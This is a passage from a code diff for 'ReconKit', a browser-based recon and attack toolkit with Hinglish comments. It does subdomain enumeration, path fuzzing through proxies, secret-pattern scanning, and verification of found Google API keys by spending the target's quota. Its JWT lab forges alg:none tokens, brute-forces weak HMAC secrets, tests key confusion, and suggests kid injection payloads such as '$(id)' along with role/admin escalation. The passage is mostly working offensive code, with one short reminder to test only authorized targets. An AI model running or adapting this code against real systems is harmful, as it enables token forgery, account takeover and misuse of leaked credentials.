+  btn.disabled=false;
+  hideProgress("#subs-prog");
+}
+function renderSubs(merged){
+  const rows=[...merged.entries()].sort((a,b)=>a[0].localeCompare(b[0])).map(([h,m])=>{
+    const a=Array.isArray(m.a)?m.a.join(", "):(m.a==="ERR"?"(NXDOMAIN/err)":(m.a||"—"));
+    const live=m.live===""?'<span class="hint">—</span>':(m.live==="ERR"?'<span class="chip bad">err</span>':'<span class="chip '+(m.live<400?"ok":"warn")+'">'+m.live+"</span> "+esc(m.server||""));
+    return "<tr><td>"+esc(h)+"</td><td>"+esc(a)+"</td><td>"+(m.ct?chip("CT"):"")+"</td><td>"+live+"</td><td><button class='ghost small' onclick=\"liveCheckSub('"+esc(h).replace(/'/g,"\\'")+"',this)\">check</button></td></tr>";
+  }).join("");
+  $("#subs-table").innerHTML="<tr><th>Subdomain</th><th>A record</th><th>Source</th><th>Live</th><th></th></tr>"+(rows||'<tr><td colspan="5"><span class="hint">Kuch nahi mila — Brute Force dabao.</span></td></tr>');
+}
+window.liveCheckSub=async function(h,btn){
+  btn.textContent="…";
+  try{
+    const r=await smartFetch("https://"+h);
+    btn.textContent=r.status;
+    const m=state.subsMerged&&state.subsMerged.get(h);
+    if(m){m.live=r.status;m.server=((r.headers||[]).find(x=>x[0].toLowerCase()==="server")||[])[1]||"";renderSubs(state.subsMerged);}
+  }catch(e){btn.textContent="err";}
+};
+function exportSubsCsv(){
+  if(!state.subs.length){toast("Pehle Brute Force chalao",true);return;}
+  const d=normDom($("#sub-domain").value)||"subs";
+  let rows="subdomain,a,source,live\n";
+  state.subs.forEach(s=>{
+    const m=state.subsMerged.get(s)||{};
+    const a=Array.isArray(m.a)?m.a.join(";"):(m.a||"");
+    rows+=[s,a,m.ct?"CT":"brute",m.live||""].join(",")+"\n";
+  });
+  download("subs_"+d+".csv",rows,"text/csv");
+  toast("CSV downloaded");
+}
+
+/* ================= SITE SCAN ================= */
+let scanAC=null;
+function scoreFuzz(f){
+  let s=0;
+  if(f.status===200||f.status===204)s+=4;
+  else if(f.status>=200&&f.status<300)s+=3;
+  else if(f.status===401||f.status===403)s+=2;
+  else if(f.status>=300&&f.status<400)s+=2;
+  else if(f.status===500)s+=1;
+  if(f.body&&SECRETS.some(x=>x[1].test(f.body)))s+=10;
+  return s;
+}
+function parseCookie(sc){
+  const parts=sc.split(";").map(s=>s.trim());
+  const eq=parts[0].indexOf("=");
+  const name=eq>0?parts[0].slice(0,eq):parts[0];
+  const val=eq>0?parts[0].slice(eq+1):"";
+  return{name:name||sc,value:val.slice(0,40),secure:/secure/i.test(sc),httpOnly:/httponly/i.test(sc),sameSite:(sc.match(/samesite=\w+/i)||[null])[0]||""};
+}
+function securityChecks(H,cookies){
+  const c=(label,ok,pts)=>({label,ok:!!ok,pts});
+  const hsts=H["strict-transport-security"]||"";
+  const out=[];
+  out.push(c("HSTS (max-age ≥ 1yr + includeSubDomains",/max-age=\s*(31536000|\d{8,})/.test(hsts)&&/includesubdomains/i.test(hsts),25));
+  out.push(c("Content-Security-Policy",H["content-security-policy"],15));
+  out.push(c("X-Content-Type-Options: nosniff",/nosniff/i.test(H["x-content-type-options"]||""),10));
+  out.push(c("Clickjacking protection (XFO / frame-ancestors)",/deny|sameorigin/i.test(H["x-frame-options"]||"")||/frame-ancestors/i.test(H["content-security-policy"]||""),10));
+  out.push(c("Referrer-Policy",H["referrer-policy"],10));
+  out.push(c("Permissions-Policy",H["permissions-policy"],10));
+  out.push(c("Server version hidden",!/nginx\/|apache\/|IIS\/|Microsoft-IIS/i.test(H["server"]||""),5));
+  out.push(c("X-Powered-By hidden",!H["x-powered-by"],5));
+  out.push(c("Cookies Secure+HttpOnly",cookies.length>0&&cookies.every(k=>k.secure&&k.httpOnly),5));
+  out.push(c("No CORS * + credentials",!(H["access-control-allow-origin"]==="*"&&/true/i.test(H["access-control-allow-credentials"]||"")),5));
+  return out;
+}
+async function runSiteScan(){
+  let url=$("#site-url").value.trim();
+  if(!url){const d=normDom($("#main-domain").value);if(d)url="https://"+d;}
+  if(!url){toast("URL do",true);return;}
+  if(!/^https?:\/\//i.test(url))url="https://"+url;
+  state.domain=url;
+  $("#sub-domain").value=normDom(url);
+  scanAC=new AbortController();
+  const sig=scanAC.signal;
+  const st=$("#site-status"),btn=$("#btn-scan"),stop=$("#btn-scan-stop");
+  btn.disabled=true;stop.disabled=false;
+  try{
+    statusEl(st,"[1/5] Fetching main page…");
+    setProgress("#site-prog",5);
+    let main=null;
+    try{main=await smartFetch(url,sig);}catch(e){statusEl(st,"⚠ Main page fetch fail: "+e.message+" — CORS closed + public proxies fail. Custom proxy try karo.");}
+    const S={url,ts:Date.now(),main:main?{status:main.status,size:main.text.length,native:main.native,proxy:main.proxy}:null,headers:main?main.headers:null,checks:[],score:0,tech:[],waf:[],cookies:[],robots:null,sitemap:[],fuzz:[],secrets:[],gmap:[]};
+    if(main){
+      const hay=main.text+(main.headers?main.headers.map(h=>h[1]).join("\n"):"");
+      TECH.forEach(t=>{if(t[1].test(hay))S.tech.push(t[0]);});
+      WAFT.forEach(t=>{if(t[1].test(hay))S.waf.push(t[0]);});
+      if(main.headers){
+        const H={};
+        main.headers.forEach(([k,v])=>{H[k.toLowerCase()]=v;});
+        S.cookies=main.headers.filter(h=>h[0].toLowerCase()==="set-cookie").map(h=>parseCookie(h[1]));
+        S.checks=securityChecks(H,S.cookies);
+        S.score=S.checks.reduce((s,c)=>s+(c.ok?c.pts:0),0);
+      }
+    }
+    statusEl(st,"[2/5] robots.txt + sitemap…");
+    setProgress("#site-prog",20);
+    let origin;
+    try{origin=new URL(url).origin;}catch(e){origin=url;}
+    try{const r=await proxyBody(origin+"/robots.txt",15000,sig);S.robots=r.text.slice(0,2000);}catch(e){}
+    try{
+      const r=await proxyBody(origin+"/sitemap.xml",15000,sig);
+      S.sitemap=[...new Set((r.text.match(/<loc>\s*([^<]+?)\s*<\/loc>/g)||[]).map(x=>x.replace(/<\/?loc>/g,"")))].slice(0,40);
+    }catch(e){}
+    let paths=[...PATHS];
+    const extra=($("#extra-paths").value||"").split("\n").map(x=>x.trim()).filter(x=>x.startsWith("/"));
+    paths=[...new Set([...paths,...extra])];
+    if($("#fast-mode").checked)paths=paths.slice(0,25);
+    statusEl(st,"[3/5] Path fuzzing — "+paths.length+" paths…");
+    setProgress("#site-prog",30);
+    let fails=0,done=0;
+    const results=new Array(paths.length);
+    const idx=[...paths.keys()];
+    const fuzzWorker=async()=>{
+      while(idx.length){
+        const i=idx.shift();if(i===undefined)break;
+        const p=paths[i];
+        try{
+          const r=await proxyBody(origin+p,15000,sig);
+          results[i]={p,status:r.status,size:r.text.length,body:r.text.slice(0,60000)};
+          fails=0;
+        }catch(e){results[i]={p,status:0,size:0,body:"",err:e.message};fails++;}
+        done++;
+        if(done%5===0)setProgress("#site-prog",30+done/paths.length*60);
+        if(fails>=5)throw new Error("proxy rate-limit/timeout — fuzz roka (fast mode ya custom proxy try karo)");
+        await sleep(20);
+      }
+    };
+    try{
+      await Promise.all(Array.from({length:4},fuzzWorker));
+    }catch(e){statusEl(st,"[3/5] Fuzz partial: "+e.message);}
+    S.fuzz=results.filter(Boolean).sort((a,b)=>scoreFuzz(b)-scoreFuzz(a));
+    statusEl(st,"[4/5] Scanning for secrets & leaks…");
+    setProgress("#site-prog",92);
+    const corpus=[["main page",main?main.text:""]];
+    if(S.robots)corpus.push(["robots.txt",S.robots]);
+    S.fuzz.forEach(f=>{if(f.body)corpus.push(["path "+f.p,f.body]);});
+    corpus.forEach(pair=>{
+      const label=pair[0],txt=pair[1];
+      if(!txt)return;
+      SECRETS.forEach(sec=>{
+        const m=txt.match(sec[1]);
+        if(m)m.slice(0,5).forEach(x=>S.secrets.push({label,name:sec[0],match:String(x).slice(0,120)}));
+      });
+    });
+    if(main){
+      const keys=[...new Set(main.text.match(/AIza[0-9A-Za-z\-_]{35}/g)||[])];
+      if(keys.length){
+        statusEl(st,"[5/5] "+keys.length+" Google API key(s) found"+($("#verify-gmap").checked?" — verifying via geocode (quota 1/key consume hoga)…":" — verification skip (checkbox off)."));
+        for(const k of keys.slice(0,3)){
+          let status="not verified (checkbox off)";
+          if($("#verify-gmap").checked){
+            try{
+              const r=await proxyBody("https://maps.googleapis.com/maps/api/geocode/json?address=New+Delhi&key="+k,15000,sig);
+              status=/"status"\s*:\s*"OK"/.test(r.text)?"VALID (quota hit)":"invalid / blocked / no quota";
+            }catch(e){status="verify failed";}
+          }
+          S.gmap.push({key:k,status});
+        }
+      }
+    }
+    state.site=S;
+    renderSite(S);
+    addHistory("scan",normDom(url),S);
+    statusEl(st,"✅ Scan complete — score "+(S.headers?S.score+"/100":"n/a (headers nahi)"),S.secrets.length+" secret hits");
+    if(S.secrets.length)toast("⚠ "+S.secrets.length+" secret pattern(s) mila!",true);
+  }catch(e){
+    if(e.name!=="AbortError")statusEl(st,"⚠ "+e.message);
+    else statusEl(st,"■ Stopped by user.");
+  }
+  btn.disabled=false;stop.disabled=true;
+  hideProgress("#site-prog");
+}
+function renderSite(S){
+  const el=$("#site-out");
+  let h="";
+  h+=card("📌 Summary",kv([
+    ["URL",esc(S.url)],
+    ["Final status",S.main?String(S.main.status):"fetch failed"],
+    ["Body size",S.main?(S.main.size+" bytes"):"—"],
+    ["Fetch mode",S.main?esc(S.main.proxy+(S.main.native?" (target CORS-open)":"")):"—"]
+  ]));
+  h+=card("🧩 Tech Detection",S.tech.length?S.tech.map(t=>chip(t)).join(""):'<span class="hint">kuch detect nahi hua</span>');
+  h+=card("🛡 WAF / CDN Guess",S.waf.length?S.waf.map(t=>chip(t,"warn")).join(""):'<span class="hint">koi WAF/CDN signature nahi mila</span>');
+  if(S.headers){
+    h+=card("📄 Response Headers","<table><tr><th>Header</th><th>Value</th></tr>"+S.headers.map(x=>"<tr><td>"+esc(x[0])+"</td><td>"+esc(x[1])+"</td></tr>").join("")+"</table>");
+    h+=card("🏆 Security Header Score",checksHtml(S.checks,S.score));
+  }else{
+    h+=card("🏆 Security Header Score",'<span class="hint">Public CORS proxies headers strip kar dete hain. Full header analysis ke liye <b>Custom proxy</b> set karo (README.md me 5-line Node/PHP snippet). Target khud CORS-open ho to headers automatically mil jaate hain.</span>');
+  }
+  if(S.cookies.length)h+=card("🍪 Cookies",'<table><tr><th>Name</th><th>Secure</th><th>HttpOnly</th><th>SameSite</th></tr>'+S.cookies.map(c=>"<tr><td>"+esc(c.name)+"</td><td>"+(c.secure?chip("yes","ok"):chip("no","bad"))+"</td><td>"+(c.httpOnly?chip("yes","ok"):chip("no","bad"))+"</td><td>"+esc(c.sameSite)+"</td></tr>").join("")+"</table>");
+  if(S.robots)h+=card("🤖 robots.txt","<pre>"+esc(S.robots)+"</pre>");
+  if(S.sitemap.length)h+=card("🗺 Sitemap URLs ("+S.sitemap.length+")","<pre>"+esc(S.sitemap.join("\n"))+"</pre>");
+  if(S.fuzz.length){
+    const rows=S.fuzz.map(f=>{
+      let sc;
+      if(f.status===0)sc='<span class="hint">err</span>';
+      else if(f.status>=200&&f.status<400)sc=chip(f.status,"ok");
+      else if(f.status===404)sc=chip(f.status);
+      else sc=chip(f.status,"warn");
+      return "<tr><td>"+esc(f.p)+"</td><td>"+sc+"</td><td>"+f.size+"</td></tr>";
+    }).join("");
+    h+=card("🔍 Path Fuzz ("+S.fuzz.length+") — interesting pehle","<div style='max-height:400px;overflow:auto'><table><tr><th>Path</th><th>Status</th><th>Size</th></tr>"+rows+"</table></div>");
+  }
+  if(S.secrets.length){
+    const rows=S.secrets.map(s=>"<tr><td>"+esc(s.label)+"</td><td>"+chip(s.name,"bad")+"</td><td>"+esc(s.match)+"</td></tr>").join("");
+    h+=card("🧨 Secrets / Leaks Found","<table><tr><th>Where</th><th>Type</th><th>Match (truncated)</th></tr>"+rows+"</table>");
+  }else{
+    h+=card("🧨 Secrets / Leaks",'<span class="chip ok">koi known secret pattern nahi mila</span>');
+  }
+  if(S.gmap.length){
+    h+=card("🗺 Google Maps API Keys",S.gmap.map(g=>'<div class="check-row"><span>'+esc(g.key)+'</span><span class="'+(/VALID/.test(g.status)?"ok":"fail")+'">'+esc(g.status)+"</span></div>").join("")+'<div class="hint" style="margin-top:6px">Verification 1 geocode quota per key consume karta hai (target ke account se). ReconSage-style check.</div>');
+  }
+  el.innerHTML='<div class="grid">'+h+"</div>";
+}
+/* ================= JWT LAB ================= */
+function jwtHeader(t){
+  const parts=t.split(".");
+  if(parts.length<2)throw new Error("invalid format");
+  return JSON.parse(b64urlDec(parts[0]));
+}
+async function decodeJwt(){
+  const t=$("#jwt-input").value.trim();
+  const out=$("#jwt-out"),st=$("#jwt-status");
+  if(!t){out.innerHTML="";return;}
+  if(!/^[\w\-\.]+$/.test(t)){toast("JWT me sirf base64url chars chahiye",true);return;}
+  const parts=t.split(".");
+  if(parts.length<2){toast("Invalid JWT — 2/3 dots wala token chahiye",true);return;}
+  let h,p;
+  try{h=JSON.parse(b64urlDec(parts[0]));}catch(e){st.textContent="Header decode fail: "+e.message;return;}
+  try{p=JSON.parse(b64urlDec(parts[1]));}catch(e){st.textContent="Payload decode fail: "+e.message;return;}
+  state.jwt={t,parts,h,p};
+  const audit=[];
+  const alg=String(h.alg||"");
+  if(alg.toLowerCase()==="none")audit.push(["crit","alg: none — signature bina verify ke accept ho sakta hai agar server check nahi karta"]);
+  if(/^HS/i.test(alg))audit.push(["warn","alg: "+alg+" — agar server RS* expect karta hai to key-confusion possible (public key ko HMAC secret ki tarah try karo)"]);
+  if(h.jwk)audit.push(["warn","jwk header present — embedded key se signature verify karo"]);
+  if(h.jku)audit.push(["warn","jku: "+h.jku+" — external JWKS URL, hijack/overwrite test karo"]);
+  if(h.x5u)audit.push(["warn","x5u: "+h.x5u+" — external cert URL, hijack test karo"]);
+  if(h.kid&&/[/\\$%]/.test(String(h.kid)))audit.push(["warn","kid: "+h.kid+" — path traversal / command injection test karo (../../dev/null, $(id))"]);
+  if(h.typ&&h.typ!=="JWT")audit.push(["info","typ: "+h.typ]);
+  const now=Date.now()/1000;
+  if(p.exp!==undefined){
+    const d=p.exp-now;
+    if(d<0)audit.push(["fail","exp: EXPIRED "+Math.floor(-d/3600)+"h pehle"]);
+    else if(d<86400)audit.push(["warn","exp: "+Math.floor(d/3600)+"h me expire hoga"]);
+    else audit.push(["ok","exp: valid (+"+Math.floor(d/86400)+"d)"]);
+  }
+  if(p.iat!==undefined&&p.iat>now+300)audit.push(["fail","iat: future me hai (clock tampering?)"]);
+  if(p.nbf!==undefined&&p.nbf>now+300)audit.push(["warn","nbf: future me hai"]);
+  ["iss","aud","sub","jti","email","role","admin","scope","permissions"].forEach(k=>{
+    if(p[k]!==undefined)audit.push(["info",k+": "+JSON.stringify(p[k]).slice(0,90)]);
+  });
+  if(!audit.length)audit.push(["info","koi obvious red flag nahi mila — claims manually audit karo"]);
+  const cls={crit:"bad",fail:"bad",warn:"warn",ok:"ok",info:""};
+  out.innerHTML='<div class="grid"><div class="card"><h3>Header</h3><pre>'+prettyJson(h)+'</pre></div><div class="card"><h3>Payload</h3><pre>'+prettyJson(p)+'</pre></div></div>'+card("🔍 Audit",audit.map(a=>'<div class="check-row"><span>'+chip(a[0].toUpperCase(),cls[a[0]])+'</span><span>'+esc(a[1])+"</span></div>").join(""));
+  st.textContent="Decoded ✓ (alg: "+alg+")";
+}
+async function genNone(){
+  const t=$("#jwt-input").value.trim();
+  const parts=t.split(".");
+  if(parts.length<2){toast("Pehle JWT paste karo",true);return;}
+  const nh=b64url(JSON.stringify({typ:"JWT",alg:"none"}));
+  const token=nh+"."+parts[1]+".";
+  const out=$("#jwt-out");
+  out.innerHTML=card("⚠ alg:none token","<div class='hint' style='margin-bottom:8px'>Agar server alg:none accept karta hai to yeh signature ke bina chala jayega. Sirf authorized targets par test karo. (Kabhi kabhi 'None'/'nOnE' case variations bhi chalti hain.)</div><pre id='none-tok'>"+esc(token)+"</pre>");
+  const b=document.createElement("button");
+  b.className="ghost small";b.textContent="📋 Copy";
+  b.onclick=()=>copyText(token);
+  out.querySelector(".card").appendChild(b);
+}
+async function bruteJwt(){
+  if(!window.crypto||!window.crypto.subtle){toast("crypto.subtle available nahi — page https (secure context) par ho to chalega",true);return;}
+  const t=$("#jwt-input").value.trim();
+  const parts=t.split(".");
+  if(parts.length<3){toast("3-part (signed) JWT chahiye",true);return;}
+  let h;
+  try{h=jwtHeader(t);}catch(e){toast("Header decode fail",true);return;}
+  if(!/^HS/i.test(String(h.alg||""))){toast("Yeh HS* token nahi hai (alg="+h.alg+"). Weak-key brute HS256/384/512 par hota hai.",true);return;}
+  const hashMap={HS256:"SHA-256",HS384:"SHA-384",HS512:"SHA-512"};
+  const hash=hashMap[String(h.alg).toUpperCase()]||"SHA-256";
+  const msg=parts[0]+"."+parts[1],sig=parts[2];
+  const st=$("#jwt-status");
+  for(let i=0;i<JWTDICT_ARR.length;i++){
+    const key=JWTDICT_ARR[i];
+    try{
+      const k=await crypto.subtle.importKey("raw",new TextEncoder().encode(key),{name:"HMAC",hash},false,["sign"]);
+      const s=new Uint8Array(await crypto.subtle.sign("HMAC",k,new TextEncoder().encode(msg)));
+      if(b64url(String.fromCharCode.apply(null,s))===sig){
+        st.textContent='🎯 MATCH! secret = "'+key+'"';
+        $("#jwt-out").insertAdjacentHTML("beforeend",card("🎯 Weak key found","<pre>secret: "+esc(key)+"</pre><div class='hint'>Ab is key se koi bhi claim/token sign kar sakte ho — role/admin escalation test karo.</div>"));
+        toast("Weak key mila: "+key);
+        return;
+      }
+    }catch(e){}
+    if(i%10===0){st.textContent="Bruting… "+(i+1)+"/"+JWTDICT_ARR.length;await sleep(0);}
+  }
+  st.textContent="Dictionary me se koi key match nahi hui ("+JWTDICT_ARR.length+" tried).";
+}
+async function hmacBytes(keyBytes,msg,sigB64,alg){
+  const hashMap={HS256:"SHA-256",HS384:"SHA-384",HS512:"SHA-512"};
+  const hash=hashMap[String(alg).toUpperCase()]||"SHA-256";
+  const k=await crypto.subtle.importKey("raw",keyBytes,{name:"HMAC",hash},false,["sign"]);
+  const s=new Uint8Array(await crypto.subtle.sign("HMAC",k,new TextEncoder().encode(msg)));
+  return b64url(String.fromCharCode.apply(null,s))===sigB64;
+}
+async function verifyJwt(){
+  if(!window.crypto||!window.crypto.subtle){toast("https (secure context) required",true);return;}
+  const t=$("#jwt-input").value.trim();
+  const keyTxt=$("#jwt-key").value.trim();
+  const out=$("#jwt-out"),st=$("#jwt-status");
+  const parts=t.split(".");
+  if(parts.length<3){toast("3-part JWT chahiye",true);return;}
+  if(!keyTxt){toast("PEM key / secret paste karo (Verify button ke upar card)",true);return;}
+  const msg=parts[0]+"."+parts[1];
+  let h;
+  try{h=jwtHeader(t);}catch(e){toast("Header decode fail",true);return;}
+  const isPem=/BEGIN (RSA )?PUBLIC KEY/i.test(keyTxt);
+  if(isPem){
+    try{
+      const der=atobBytes(keyTxt.replace(/-----[^-]+-----/g,"").replace(/\s/g,""));
+      const key=await crypto.subtle.importKey("spki",der,{name:"RSASSA-PKCS1-v1_5",hash:"SHA-256"},false,["verify"]);
+      const ok=await crypto.subtle.verify({name:"RSASSA-PKCS1-v1_5"},key,atobBytes(parts[2].replace(/-/g,"+").replace(/_/g,"/")),new TextEncoder().encode(msg));
+      out.insertAdjacentHTML("beforeend",card("🛡 RS verify (tumhari key)",chip(ok?"✅ VALID signature":"❌ INVALID",ok?"ok":"bad")));
+      st.textContent="RS verify: "+(ok?"valid":"invalid");
+    }catch(e){toast("PEM import fail: "+e.message,true);return;}
+  }else{
+    try{
+      const ok=await hmacBytes(new TextEncoder().encode(keyTxt),msg,parts[2],h.alg||"HS256");
+      out.insertAdjacentHTML("beforeend",card("🛡 HMAC verify (tumhara secret)",chip(ok?"✅ VALID":"❌ INVALID",ok?"ok":"bad")));
+    }catch(e){toast("HMAC check fail: "+e.message,true);return;}
+  }
+  if(isPem&&/^HS/i.test(String(h.alg||""))){
+    try{
+      const der=atobBytes(keyTxt.replace(/-----[^-]+-----/g,"").replace(/\s/g,""));
+      const ok=await hmacBytes(der,msg,parts[2],h.alg);
+      out.insertAdjacentHTML("beforeend",card("🎭 Key-confusion (PEM bytes as HMAC secret)",chip(ok?"✅ PUBLIC KEY AS HMAC SECRET WORKS — CRITICAL":"✗ nahi chala",ok?"bad":"ok")));
+      if(ok)toast("Key-confusion vulnerable!",true);
+    }catch(e){}
+  }
+}
+function copyText(txt){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(txt).then(()=>toast("Copied ✓")).catch(()=>fallbackCopy(txt));
+  }else fallbackCopy(txt);
+}
+function fallbackCopy(txt){
+  const ta=document.createElement("textarea");
+  ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand("copy");toast("Copied ✓");}catch(e){toast("Copy fail",true);}
+  ta.remove();
+}
+
+/* ================= TOOLS ================= */
+function ip2int(ip){return ip.split(".").reduce((a,o)=>((a<<8)+parseInt(o,10)),0)>>>0;}
+function int2ip(n){return [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join(".");}
+function cidrCalc(str){
+  str=(str||"").trim();
+  if(str.indexOf("/")>=0){
+    const p=str.split("/");
+    const ip=p[0],n=parseInt(p[1],10);
+    if(!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)||isNaN(n)||n<1||n>32)return null;
+    if(n===32){return{net:ip,bcast:ip,first:ip,last:ip,hosts:1,prefix:32};}
+    const mask=(0xFFFFFFFF<<(32-n))>>>0;
+    const net=ip2int(ip)&mask;
+    const bcast=net|(~mask>>>0);
+    const first=n===31?net:net+1,last=n===31?bcast:bcast-1;
+    return{net:int2ip(net),bcast:int2ip(bcast),first:int2ip(first),last:int2ip(last),hosts:n===31?2:((1<<(32-n))-2),prefix:n};
+  }
+  if(/^(\d{1,3}\.){3}\d{1,3}$/.test(str))return{net:str,bcast:str,first:str,last:str,hosts:1,prefix:32};
+  return null;
+}
+const ENC={
+  b64e:s=>btoa(unescape(encodeURIComponent(s))),
+  b64d:s=>decodeURIComponent(escape(atob(s.trim()))),
+  ure:s=>encodeURIComponent(s),
+  urd:s=>decodeURIComponent(s),
+  he:s=>{let o="";const b=new TextEncoder().encode(s);for(const x of b)o+=x.toString(16).padStart(2,"0");return o;},
+  hd:s=>{
+    const c=s.replace(/\s+/g,"");
+    if(!/^[0-9a-fA-F]+$/.test(c)||c.length%2)throw new Error("invalid hex");
+    const b=new Uint8Array(c.length/2);
+    for(let i=0;i<b.length;i++)b[i]=parseInt(c.substr(i*2,2),16);
+    return new TextDecoder().decode(b);
+  },
+  rev:s=>[...s].reverse().join(""),
+  uni:s=>[...s].map(c=>c.charCodeAt(0)>126?"\\u"+c.charCodeAt(0).toString(16):c).join("")
+};
+
+/* ================= PAYLOADS render ================= */
+function renderPayloads(){
+  const el=$("#payloads-out");
+  const flat=[];
+  let html="";
+  PAYLOADS.forEach((cat,ci)=>{
+    html+="<details "+(ci===0?"open":"")+'><summary>'+esc(cat.cat)+" · "+cat.items.length+"</summary>";
+    cat.items.forEach(it=>{
+      flat.push(it[1]);
+      html+='<div class="payload"><div class="head"><span>'+esc(it[0])+'</span><button class="ghost small" data-pidx="'+(flat.length-1)+'">📋 copy</button></div><pre>'+esc(it[1])+"</pre></div>";
+    });
+    html+="</details>";
+  });
+  el.innerHTML=html;
+  $$("#payloads-out [data-pidx]").forEach(b=>{
+    b.onclick=()=>copyText(flat[+b.dataset.pidx]);
+  });
+}
+
+/* ================= HISTORY & REPORTS ================= */
+function renderHistory(){
+  const h=loadHist();
+  const el=$("#hist-list");
+  if(!h.length){el.innerHTML='<span class="hint">Abhi koi history nahi — Recon 360 ya Site Scan chalao.</span>';return;}
+  el.innerHTML=h.map(x=>'<div class="history-item" data-id="'+x.id+'">'+chip(x.kind==="recon"?"🌐 recon":"🕸 scan")+"<b>"+esc(x.domain)+"</b><span class='hint'>"+new Date(x.ts).toLocaleString()+"</span><span class='row' style='flex:1;justify-content:flex-end'><button class='ghost small' data-act='open'>Open</button><button class='ghost small' data-act='json'>⬇ JSON</button><button class='danger small' data-act='del'>✕</button></span></div>").join("");
+}
+function buildReportMd(){
+  let m="# ReconKit Report\n\n_Generated: "+new Date().toISOString()+"_\n\n";
+  if(state.recon){
+    const R=state.recon;
+    m+="## Recon 360 — "+R.domain+"\n\n**Score: "+(R.score||0)+"/100**\n\n";
+    m+=R.checks.map(c=>"- ["+(c.ok?"x":"")+"] "+c.label).join("\n")+"\n\n";
+    m+="### DNS\n\n";
+    Object.keys(R.dns).forEach(t=>{m+="**"+t+":** "+R.dns[t].join(", ")+"\n\n";});
+    m+="### IPs\n\n";
+    R.ips.forEach(i=>{m+="- "+i.ip+" — "+(i.geo?i.geo.country+" "+(i.geo.city||"")+" ("+(i.geo.isp||"")+") ":"")+(i.asn||"")+" "+(i.cidr||"")+"\n";});
+    m+="\n### Email Security\n\n";
+    m+="SPF: "+(R.spf||"missing")+"\nDMARC: "+(R.dmarc||"missing")+"\nMTA-STS: "+(R.mtaSts||"missing")+"\nTLS-RPT: "+(R.tlsrpt||"missing")+"\nDKIM selectors: "+Object.keys(R.dkim||{}).join(", ")+"\n\n";
+    m+="### Subdomains (CT): "+R.ct.length+"\n\n";
+    R.ct.slice(0,150).forEach(c=>{m+="- "+c.name+"\n";});
+    if(R.wayback&&R.wayback.total)m+="\n### Wayback\n\nCaptures(sampled): "+R.wayback.total+" | oldest: "+R.wayback.oldest+" | newest: "+R.wayback.newest+"\n\n";
+  }
+  if(state.site){
+    const S=state.site;
+    m+="## Site Scan — "+S.url+"\n\n";
+    m+="Status: "+(S.main?S.main.status:"fail")+" | Fetch: "+(S.main?S.main.proxy:"")+"\n\n";
+    if(S.headers)m+="**Security score: "+S.score+"/100**\n\n"+S.checks.map(c=>"- ["+(c.ok?"x":"")+"] "+c.label).join("\n")+"\n\n";
+    if(S.tech.length)m+="Tech: "+S.tech.join(", ")+"\n\n";
+    if(S.waf.length)m+="WAF/CDN: "+S.waf.join(", ")+"\n\n";
+    if(S.fuzz.length)m+="### Interesting paths\n\n";
+    S.fuzz.slice(0,25).forEach(f=>{m+="- "+f.p+" → "+(f.status||"err")+" ("+f.size+"B)\n";});
+    if(S.secrets.length){m+="\n### ⚠ Secrets\n\n";S.secrets.forEach(s=>{m+="- ["+s.label+"] "+s.name+": "+s.match+"\n";});}
+    if(S.gmap.length){m+="\n### GMap keys\n\n";S.gmap.forEach(g=>{m+="- "+g.key+" → "+g.status+"\n";});}
+  }
+  if(state.subs.length)m+="\n## Subdomains (brute+CT)\n\n"+state.subs.map(s=>"- "+s).join("\n")+"\n";
+  m+="\n---\n_Generated by ReconKit v1.0 — client-side recon lab_\n";
+  return m;
+}
+
+/* ================= INIT ================= */
+/* ================= TERMINAL + BUILT-IN HASHES + WIKI/GTFO ================= */
+/* ================= BUILT-IN HASH ENGINE (MD5 + SHA1 — RFC-verified, offline) ================= */
+function rkRotl(n,c){return (n<<c)|(n>>>(32-c));}
+function rkBytes(s){const out=[];for(let i=0;i<s.length;i++){let c=s.codePointAt(i);if(c>0xffff)i++;if(c<0x80)out.push(c);else if(c<0x800)out.push(192|(c>>6),128|(c&63));else if(c<0x10000)out.push(224|(c>>12),128|((c>>6)&63),128|(c&63));else out.push(240|(c>>18),128|((c>>12)&63),128|((c>>6)&63),128|(c&63));}return out;}
+function rkHexBE(n){let s="";for(let i=3;i>=0;i--)s+=((n>>(8*i))&255).toString(16).padStart(2,"0");return s;}
+function sha1h(str){
+  const bytes=rkBytes(str);
+  const bitLen=bytes.length*8;
+  bytes.push(0x80);
+  while(bytes.length%64!==56)bytes.push(0);
+  const hi=Math.floor(bitLen/4294967296), lo=bitLen>>>0;
+  bytes.push((hi>>>24)&255,(hi>>>16)&255,(hi>>>8)&255,hi&255,(lo>>>24)&255,(lo>>>16)&255,(lo>>>8)&255,lo&255);
+  let h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
+  for(let i=0;i<bytes.length;i+=64){
+    const M=new Array(80);
+    for(let j=0;j<16;j++)M[j]=((bytes[i+j*4]<<24)|(bytes[i+j*4+1]<<16)|(bytes[i+j*4+2]<<8)|bytes[i+j*4+3])>>>0;
+    for(let j=16;j<80;j++)M[j]=rkRotl(M[j-3]^M[j-8]^M[j-14]^M[j-16],1);
+    let a=h0,b=h1,c=h2,d=h3,e=h4;
+    for(let j=0;j<80;j++){
+      let f,k;
+      if(j<20){f=(b&c)|(~b&d);k=0x5A827999;}
+      else if(j<40){f=b^c^d;k=0x6ED9EBA1;}
+      else if(j<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC;}
+      else{f=b^c^d;k=0xCA62C1D6;}
+      const t=(rkRotl(a,5)+f+e+k+M[j])>>>0;
+      e=d; d=c; c=rkRotl(b,30); b=a; a=t;
+    }
+    h0=(h0+a)>>>0;h1=(h1+b)>>>0;h2=(h2+c)>>>0;h3=(h3+d)>>>0;h4=(h4+e)>>>0;
+  }
+  return rkHexBE(h0)+rkHexBE(h1)+rkHexBE(h2)+rkHexBE(h3)+rkHexBE(h4);
+}
+function md5h(str){
+  const S=[7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
